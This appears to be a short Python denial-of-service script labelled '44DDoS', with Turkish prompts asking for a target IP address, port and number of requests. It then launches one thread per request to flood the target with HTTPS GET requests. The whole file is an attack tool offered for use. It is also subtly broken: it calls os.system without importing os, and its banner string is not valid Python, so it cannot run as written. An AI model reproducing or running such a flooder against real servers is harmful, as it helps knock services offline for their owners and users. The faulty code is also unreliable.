import requests
import threading
os.system("clear")

banner=" " "

#     44DDoS.      #

#coder-admin44#
" " "

print (banner)

target_ip = input("Hedef IP adresi: ")


target_port = input("Hedef port numarası: ")


connection_count = int(input("Bağlantı isteği sayısı: "))

def connection_request():
    requests.get(f"https://{target_ip}:{target_port}")


threads = []
for i in range(connection_count):
    thread = threading.Thread(target=connection_request)
    threads.append(thread)
    thread.start()


for thread in threads:
    thread.join()
